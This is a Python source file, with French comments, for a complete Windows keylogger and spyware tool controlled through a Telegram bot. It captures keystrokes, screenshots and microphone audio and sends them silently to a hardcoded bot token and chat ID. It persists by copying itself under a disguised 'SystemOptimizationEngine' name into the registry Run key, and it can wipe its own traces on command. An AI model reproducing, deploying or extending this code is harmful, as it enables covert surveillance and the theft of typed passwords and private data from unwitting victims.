import logging
import os
import socket
import platform
import requests
import time
import threading
import uuid
import hashlib
from pynput import keyboard
from datetime import datetime
import PIL.ImageGrab
from PIL import Image
import shutil
import sys
import winreg

# ================= CONFIGURATION TELEGRAM =================
TELEGRAM_TOKEN = "8742325574:AAFF7f0ZZHa1MTAGK1SWJXLOZlPZdO9VmUk"
CHAT_ID = "6277274670" 
# ==========================================================

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import sounddevice as sd
    from scipy.io import wavfile
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

def generate_target_id():
    try:
        mac = str(uuid.getnode())
        host = socket.gethostname()
        user = os.getlogin()
        combined = f"{mac}:{host}:{user}"
        return hashlib.md5(combined.encode()).hexdigest().upper()[:12]
    except:
        return "UNKNOWN_ID"

class TelegramKeylogger:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.target_id = generate_target_id()
        self.running = True
        self.last_update_id = 0
        
        self.active = True
        self.paused = False
        self.current_mode = "normal"
        self.screenshot_count = 0
        self.audio_count = 0
        
        # Dossiers
        self.user_home = os.path.expanduser("~")
        self.log_dir = os.path.join(self.user_home, "Educational_Audit")
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        self.log_file = os.path.join(self.log_dir, "audit_log.txt")
        self.state_file = os.path.join(self.log_dir, "bot_state.txt")
        
        logging.basicConfig(
            filename=self.log_file, 
            level=logging.DEBUG, 
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        self.current_buffer = ""
        self.key_history = [] # Pour /keys
        
        self.targets = {self.target_id: {"name": socket.gethostname(), "status": "active"}}
        self.active_target = self.target_id
        
        self.register_commands()
        self.load_state()
        self.setup_persistence()

    def setup_persistence(self):
        try:
            # Nom de l'application camouflée
            app_name = "SystemOptimizationEngine"
            
            # Déterminer si on tourne en .exe (PyInstaller) ou .py
            if getattr(sys, 'frozen', False):
                current_path = os.path.realpath(sys.executable)
            else:
                current_path = os.path.realpath(__file__)

            # Chemin de destination discret (%APPDATA%\SystemOptimization)
            target_dir = os.path.join(os.getenv('APPDATA'), 'SystemOptimization')
            if not os.path.exists(target_dir):
                os.makedirs(target_dir)
            
            target_path = os.path.join(target_dir, "sys_update.exe" if current_path.endswith(".exe") else "sys_update.py")
            
            # Copier le fichier si nécessaire
            if current_path != target_path:
                shutil.copy2(current_path, target_path)
            
            # Ajouter au registre Windows (Démarrage automatique)
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            try:
                reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, f'"{target_path}"')
                winreg.CloseKey(reg_key)
                logging.info(f"Persistence established at {target_path}")
            except Exception as reg_err:
                logging.error(f"Registry error: {reg_err}")

        except Exception as e:
            logging.error(f"Persistence setup failed: {e}")

    def register_commands(self):
        self.commands = {
            "/list": self.cmd_list,
            "/select": self.cmd_select,
            "/info": self.cmd_info,
            "/broadcast": self.cmd_broadcast,
            "/send": self.cmd_send,
            "/start": self.cmd_start,
            "/stop": self.cmd_stop,
            "/activate": self.cmd_start,
            "/deactivate": self.cmd_stop,
            "/pause": self.cmd_pause,
            "/resume": self.cmd_resume,
            "/mode": self.cmd_mode,
            "/status": self.cmd_status,
            "/screenshot": self.cmd_screenshot,
            "/logs": self.cmd_logs,
            "/keys": self.cmd_keys,
            "/audio": self.cmd_audio,
            "/stats": self.cmd_stats,
            "/activity": self.cmd_activity,
            "/selfdestruct": self.cmd_selfdestruct,
            "/help": self.cmd_help
        }

    def load_state(self):
        try:
            if os.path.exists(self.state_file):
                with open(self.state_file, 'r') as f:
                    lines = f.readlines()
                    if len(lines) >= 1: self.active = (lines[0].strip() == "active")
                    if len(lines) >= 2: self.current_mode = lines[1].strip()
        except: pass

    def save_state(self):
        try:
            with open(self.state_file, 'w') as f:
                f.write("active\n" if self.active else "inactive\n")
                f.write(self.current_mode)
        except: pass

    def send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {
                "chat_id": self.chat_id, 
                "text": f"🆔 `[{self.target_id}]` {message}", 
                "parse_mode": "Markdown",
                "disable_notification": True # Envoi silencieux
            }
            requests.post(url, data=payload, timeout=10)
        except Exception as e:
            logging.error(f"Telegram error: {e}")

    def send_telegram_file(self, file_path, caption=""):
        if not os.path.exists(file_path): return
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                payload = {
                    'chat_id': self.chat_id, 
                    'caption': f"🆔 `{self.target_id}` {caption}",
                    'disable_notification': True # Envoi silencieux
                }
                requests.post(url, data=payload, files=files, timeout=20)
        except Exception as e:
            logging.error(f"File error: {e}")

    # --- COMMANDES ---
    def cmd_list(self, args):
        return f"📋 **CIBLES**\n🟢 `{self.target_id}` (Moi) - {socket.gethostname()}"

    def cmd_select(self, args):
        tid = args.strip().upper()
        if tid == self.target_id:
            self.active_target = tid
            return f"🎯 Cible `{tid}` sélectionnée."
        return f"❌ ID `{tid}` inconnu."

    def cmd_info(self, args):
        return f"ℹ️ **PROFIL**\nOS: {platform.system()}\nVersion: {platform.version()}\nCPU: {platform.processor()}"

    def cmd_broadcast(self, args):
        return f"📢 Broadcast reçu: {args}"

    def cmd_send(self, args):
        return f"✅ Commande spécifique traitée."

    def cmd_start(self, args):
        self.active = True
        self.save_state()
        return "✅ Bot **ACTIVÉ**"

    def cmd_stop(self, args):
        self.active = False
        self.save_state()
        return "🛑 Bot **DÉSACTIVÉ**"

    def cmd_pause(self, args):
        self.paused = True
        return "⏸️ En **PAUSE**"

    def cmd_resume(self, args):
        self.paused = False
        return "▶️ **REPRIS**"

    def cmd_mode(self, args):
        m = args.strip().lower()
        if m in ["normal", "surveillance", "furtif"]:
            self.current_mode = m
            self.save_state()
            return f"⚙️ Mode: **{m.upper()}**"
        return "❌ Modes: normal, surveillance, furtif"

    def cmd_status(self, args):
        s = "🟢 ACTIF" if self.active and not self.paused else "🔴 INACTIF/PAUSE"
        return f"📊 **STATUT**\nÉtat: {s}\nMode: {self.current_mode}\nBuffer: {len(self.key_history)} touches"

    def cmd_screenshot(self, args):
        self.take_screenshot()
        return "📸 Capture effectuée."

    def cmd_logs(self, args):
        self.send_telegram_file(self.log_file, "Journal complet")
        return "📂 Logs envoyés."

    def cmd_keys(self, args):
        recent = "".join(self.key_history[-100:]) if self.key_history else "Vide"
        return f"⌨️ **TOUCHES RÉCENTES**\n`{recent}`"

    def cmd_audio(self, args):
        self.record_audio(15)
        return "🎤 Enregistrement 15s démarré..."

    def cmd_stats(self, args):
        return f"📈 **STATS**\nScreens: {self.screenshot_count}\nAudios: {self.audio_count}\nTouches: {len(self.key_history)}"

    def cmd_activity(self, args):
        return "🕒 Dernière activité: " + datetime.now().strftime("%H:%M:%S")

    def cmd_selfdestruct(self, args):
        self.send_telegram("⚠️ **ALERTE AUTO-DESTRUCTION** ⚠️\nSuppression des traces et arrêt définitif...")
        
        try:
            # 1. Suppression de la persistance Registre
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(reg_key, "SystemOptimizationEngine")
            winreg.CloseKey(reg_key)
        except: pass

        # 2. Script de suppression (Batch)
        # Supprime l'exe et le dossier de logs après la fermeture
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        batch_path = os.path.join(os.environ['TEMP'], "cleanup.bat")
        
        with open(batch_path, "w") as f:
            f.write(f'@echo off\n')
            f.write(f'timeout /t 3 /nobreak > nul\n') # Attendre la fermeture de l'exe
            f.write(f'del /f /q "{exe_path}"\n')
            f.write(f'rd /s /q "{self.log_dir}"\n')
            f.write(f'del "{batch_path}"\n')

        # 3. Lancer le script et quitter
        os.startfile(batch_path)
        self.running = False
        sys.exit(0)

    def cmd_help(self, args):
        cmds = "\n".join([f"`{c}`" for c in self.commands.keys()])
        return f"📚 **AIDE**\nCommandes disponibles:\n{cmds}"

    def handle_command(self, text):
        logging.info(f"Command processing: {text}")
        text = text.strip().lower()
        parts = text.split(' ', 1)
        cmd = parts[0]
        args = parts[1] if len(parts) > 1 else ""
        
        if cmd in self.commands:
            try:
                res = self.commands[cmd](args)
                if res: self.send_telegram(res)
            except Exception as e:
                self.send_telegram(f"❌ Erreur: {e}")
        elif text.startswith('/'):
            self.send_telegram(f"❓ Inconnu: `{cmd}`. Tapez /help")

    def telegram_polling(self):
        # Clear old updates
        try:
            r = requests.get(f"https://api.telegram.org/bot{self.bot_token}/getUpdates?offset=-1", timeout=5).json()
            if r.get("ok") and r.get("result"):
                self.last_update_id = r["result"][0]["update_id"]
        except: pass

        while self.running:
            try:
                url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates?offset={self.last_update_id + 1}&timeout=30"
                resp = requests.get(url, timeout=35).json()
                if resp.get("ok"):
                    for up in resp.get("result", []):
                        self.last_update_id = up["update_id"]
                        if "message" in up and "text" in up["message"]:
                            msg = up["message"]["text"]
                            sid = str(up["message"]["chat"]["id"])
                            # Autoriser l'ID configuré
                            if sid == self.chat_id:
                                self.handle_command(msg)
                            else:
                                logging.warning(f"Unauthorized ID: {sid}")
            except Exception as e:
                time.sleep(5)
            time.sleep(1)

    def periodic_tasks(self):
        while self.running:
            if self.active and not self.paused:
                self.take_screenshot()
                self.record_audio(10)
            wait = {"normal": 300, "surveillance": 120, "furtif": 900}.get(self.current_mode, 300)
            time.sleep(wait)

    def take_screenshot(self):
        try:
            s = PIL.ImageGrab.grab()
            p = os.path.join(self.log_dir, f"sr_{int(time.time())}.png")
            s.save(p)
            self.send_telegram_file(p, "Capture auto")
            self.screenshot_count += 1
        except: pass

    def record_audio(self, sec=10):
        if not HAS_AUDIO: return
        try:
            fs = 44100
            rec = sd.rec(int(sec * fs), samplerate=fs, channels=1)
            sd.wait()
            p = os.path.join(self.log_dir, f"au_{int(time.time())}.wav")
            wavfile.write(p, fs, rec)
            self.send_telegram_file(p, "Audio auto")
            self.audio_count += 1
        except: pass

    def on_press(self, key):
        try:
            k = key.char
            if k: 
                self.current_buffer += k
                self.key_history.append(k)
        except AttributeError:
            if key == keyboard.Key.space: 
                self.current_buffer += " "
                self.key_history.append(" ")
            elif key == keyboard.Key.enter:
                if self.current_buffer:
                    logging.info(f"typing: {self.current_buffer}")
                    if self.active and not self.paused and not self.current_buffer.strip().startswith('/'):
                        self.send_telegram(f"⌨️ {self.current_buffer}")
                    self.current_buffer = ""

    def start(self):
        logging.info("Starting bot engine...")
        self.send_telegram("🚀 **SYSTÈME OPÉRATIONNEL**\nCommandes prêtes.")
        threading.Thread(target=self.periodic_tasks, daemon=True).start()
        threading.Thread(target=self.telegram_polling, daemon=True).start()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    bot = TelegramKeylogger(TELEGRAM_TOKEN, CHAT_ID)
    bot.start()
